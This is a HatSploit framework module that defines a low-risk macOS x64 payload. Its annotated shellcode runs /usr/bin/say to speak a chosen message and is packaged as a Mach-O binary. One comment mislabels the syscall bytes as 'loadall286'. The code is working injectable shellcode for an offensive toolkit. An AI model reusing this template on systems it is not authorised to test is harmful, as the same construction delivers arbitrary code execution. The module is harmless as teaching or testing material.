#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import struct

from hatvenom import HatVenom
from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "macOS x64 Say",
        'Payload': "macos/x64/say",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Say payload for macOS x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "macos",
        'Risk': "low",
        'Type': "one_side"
    }

    options = {
        'MESSAGE': {
            'Description': "Message to say.",
            'Value': "Hello, Friend!",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        message = self.parse_options(self.options)

        offsets = {
            'message': (message + '\x00').encode(),
            'call': b'\xe8' + struct.pack("<I", len((message + '\x00').encode()) + 0xd)
        }

        shellcode = (
            b"\x48\x31\xC0"          # xor rax,rax
            b"\xB8\x3B\x00\x00\x02"  # mov eax,0x200003b
            b":call:"
            b"/usr/bin/say\x00"
            b":message:"
            b"\x48\x8B\x3C\x24"      # mov rdi,[rsp]
            b"\x4C\x8D\x57\x0D"      # lea r10,[rdi+0xd]
            b"\x48\x31\xD2"          # xor rdx,rdx
            b"\x52"                  # push rdx
            b"\x41\x52"              # push r10
            b"\x57"                  # push rdi
            b"\x48\x89\xE6"          # mov rsi,rsp
            b"\x0F\x05"              # loadall286
        )

        payload = self.generate('macho', 'x64', shellcode, offsets)
        return payload
